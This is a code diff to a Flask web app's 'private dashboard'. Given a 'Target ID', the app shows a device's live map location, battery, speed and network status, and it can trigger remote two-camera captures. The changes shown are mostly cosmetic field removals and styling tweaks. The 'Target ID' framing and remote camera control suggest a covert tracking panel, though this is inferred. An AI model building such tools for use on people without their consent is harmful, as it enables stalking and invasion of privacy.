@@ -29,15 +29,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
         .search-box button:hover { background: #7dd3fc; }
         
-        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
+        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; }
         .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
         
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
-        @media(max-width: 600px) { .info-grid { grid-template-columns: 1fr 1fr; } }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
         
-        .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
+        .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 6px; }
         .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
-        .info-box strong { font-size: 15px; color: #f1f5f9; }
+        .info-box strong { font-size: 18px; color: #f1f5f9; }
         
         .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
         
@@ -63,8 +62,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
         
-        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
-        .status-online { background: #22c55e; box-shadow: 0 0 8px #22c55e; }
+        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
+        .status-online { background: #22c55e; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -84,7 +84,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         {% if erro %}
             <div class="error-box">
                 <p>⚠️ {{ erro }}</p>
-                <p style="font-size: 11px; color: #94a3b8;">Verifique o Target ID e tente novamente</p>
             </div>
         {% endif %}
         
@@ -92,37 +91,29 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
             <div class="device-section">
                 <div class="device-title">
                     <span><span class="status-dot status-online"></span> CONEXAO ATIVA // {{ id_buscado }}</span>
-                    <span style="background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px;">ONLINE</span>
+                    <span style="background: #166534; color: #4ade80; padding: 4px 10px; border-radius: 4px; font-size: 11px;">ONLINE</span>
                 </div>
                 
                 <div class="info-grid">
                     <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
-                    <div class="info-box"><span>⚡ Status</span><strong id="txt_bat_status">{{ info_moto.get('battery_status', '--') }}</strong></div>
-                    <div class="info-box"><span>🌡️ Temp. Bat.</span><strong id="txt_bat_temp">{{ info_moto.get('battery_temp', '--') }}°C</strong></div>
-                </div>
-                
-                <div class="info-grid">
-                    <div class="info-box"><span>💾 Armazenamento</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
-                    <div class="info-box"><span>🧠 RAM</span><strong id="txt_ram">{{ info_moto.get('ram', '--') }}</strong></div>
                     <div class="info-box"><span>⏱️ Tempo Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                 </div>
                 
                 <div class="info-grid">
                     <div class="info-box"><span>🚀 Velocidade</span><strong id="txt_speed" style="color: #38bdf8;">{{ info_moto.get('speed', '0') }} km/h</strong></div>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
-                    <div class="info-box"><span>🌡️ Temperatura</span><strong id="txt_temp">{{ info_moto.get('temperature', '--') }}°C</strong></div>
                 </div>
                 
                 <div id="map_private" class="map-container"></div>
                 
                 <div class="map-controls">
                     <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
-                        🗺️ Abrir no Google Maps
+                        🗺️ Google Maps
                     </a>
-                    <button id="btnTheme" class="btn-theme" onclick="alternarTema()">🌙 Mapa Escuro</button>
+                    <button id="btnTheme" class="btn-theme" onclick="alternarTema()">🌙 Escuro</button>
                 </div>
 
-                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Iniciar Captura Sincronizada</button>
+                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
                 
                 <div class="cameras-row">
                     <div class="cam-card">
@@ -148,14 +139,13 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 let mapaEscuro = false;
                 let map, marker, layerEscuro, layerClaro;
                 
-                // Camada CLARA como padrão
                 layerClaro = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     attribution: '© OpenStreetMap'
                 });
                 layerEscuro = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {});
                 
                 map = L.map('map_private', { zoomControl: true }).setView([lastValidLat, lastValidLon], 17);
-                layerClaro.addTo(map);  // PADRÃO: MAPA CLARO
+                layerClaro.addTo(map);
                 marker = L.marker([lastValidLat, lastValidLon]).addTo(map);
                 
                 function alternarTema() {
@@ -163,12 +153,12 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     if (mapaEscuro) {
                         map.removeLayer(layerEscuro);
                         layerClaro.addTo(map);
-                        btn.textContent = '🌙 Mapa Escuro';
+                        btn.textContent = '🌙 Escuro';
                         mapaEscuro = false;
                     } else {
                         map.removeLayer(layerClaro);
                         layerEscuro.addTo(map);
-                        btn.textContent = '☀️ Mapa Claro';
+                        btn.textContent = '☀️ Claro';
                         mapaEscuro = true;
                     }
                 }
@@ -206,7 +196,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                     
                                     if(data.pronto) {
                                         clearInterval(checagem);
-                                        btn.innerText = "📸 Iniciar Captura Sincronizada";
+                                        btn.innerText = "📸 Captura Sincronizada";
                                         btn.disabled = false;
                                     }
                                 }
@@ -214,19 +204,18 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                 tentativas++;
                                 if(tentativas > 40) {
                                     clearInterval(checagem);
-                                    btn.innerText = "📸 Iniciar Captura Sincronizada";
+                                    btn.innerText = "📸 Captura Sincronizada";
                                     btn.disabled = false;
                                 }
                             } catch(e){}
                         }, 1500);
                         
                     } catch(e) {
-                        btn.innerText = "📸 Iniciar Captura Sincronizada";
+                        btn.innerText = "📸 Captura Sincronizada";
                         btn.disabled = false;
                     }
                 }
 
-                // Atualização a cada 3 segundos
                 setInterval(async () => {
                     try {
                         const response = await fetch('/api/status/' + '{{ id_buscado }}');
@@ -234,20 +223,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             const data = await response.json();
                             
                             document.getElementById('txt_bateria').innerText = data.battery + '%';
-                            document.getElementById('txt_bat_status').innerText = data.battery_status || '--';
-                            document.getElementById('txt_bat_temp').innerText = (data.battery_temp || '--') + '°C';
-                            document.getElementById('txt_storage').innerText = data.storage || '--';
-                            document.getElementById('txt_ram').innerText = data.ram || '--';
                             document.getElementById('txt_uptime').innerText = data.uptime || '--';
                             document.getElementById('txt_speed').innerText = (data.speed || '0') + ' km/h';
                             document.getElementById('txt_network').innerText = data.network || '--';
-                            document.getElementById('txt_temp').innerText = (data.temperature || '--') + '°C';
-                            
-                            let tempElement = document.getElementById('txt_temp');
-                            let temp = parseFloat(data.temperature);
-                            if (temp > 40) tempElement.style.color = '#ef4444';
-                            else if (temp > 35) tempElement.style.color = '#f59e0b';
-                            else tempElement.style.color = '#22c55e';
                             
                             let nextLat = parseFloat(data.lat);
                             let nextLon = parseFloat(data.lon);
@@ -262,7 +240,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             }
                         }
                     } catch (e) {}
-                }, 3000);
+                }, 2000);
             </script>
         {% endif %}
     </div>
@@ -282,7 +260,7 @@ def index():
         if id_buscado in db_dispositivos:
             info_moto = db_dispositivos[id_buscado]
         else:
-            erro = "ID NÃO ENCONTRADO NA REDE NEXOS"
+            erro = "ID NAO ENCONTRADO NA REDE NEXOS"
             
     return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)
 
@@ -293,16 +271,11 @@ def api_status(device_id):
         d = db_dispositivos[device_id]
         return jsonify({
             "battery": d.get("battery", "N/A"),
-            "battery_status": d.get("battery_status", "Normal"),
-            "battery_temp": d.get("battery_temp", "N/A"),
-            "storage": d.get("storage", "N/A"),
             "uptime": d.get("uptime", "N/A"),
             "lat": d.get("lat", 0),
             "lon": d.get("lon", 0),
             "speed": d.get("speed", "0"),
-            "temperature": d.get("temperature", "N/A"),
-            "network": d.get("network", "N/A"),
-            "ram": d.get("ram", "N/A")
+            "network": d.get("network", "N/A")
         }), 200
     return jsonify({"error": "Not found"}), 404
 
@@ -317,21 +290,13 @@ def update():
     if device_id not in db_dispositivos:
         db_dispositivos[device_id] = {}
     
-    lat = float(data.get("lat", -16.6869))
-    lon = float(data.get("lon", -49.2648))
-    
     db_dispositivos[device_id].update({
         "battery": data.get("battery", "N/A"),
-        "battery_status": data.get("battery_status", "Normal"),
-        "battery_temp": data.get("battery_temp", "N/A"),
-        "storage": data.get("storage", "N/A"),
         "uptime": data.get("uptime", "N/A"),
-        "lat": lat,
-        "lon": lon,
+        "lat": float(data.get("lat", -16.6869)),
+        "lon": float(data.get("lon", -49.2648)),
         "speed": data.get("speed", "0"),
-        "temperature": data.get("temperature", "N/A"),
         "network": data.get("network", "N/A"),
-        "ram": data.get("ram", "N/A"),
         "last_seen": datetime.utcnow().isoformat()
     })
     
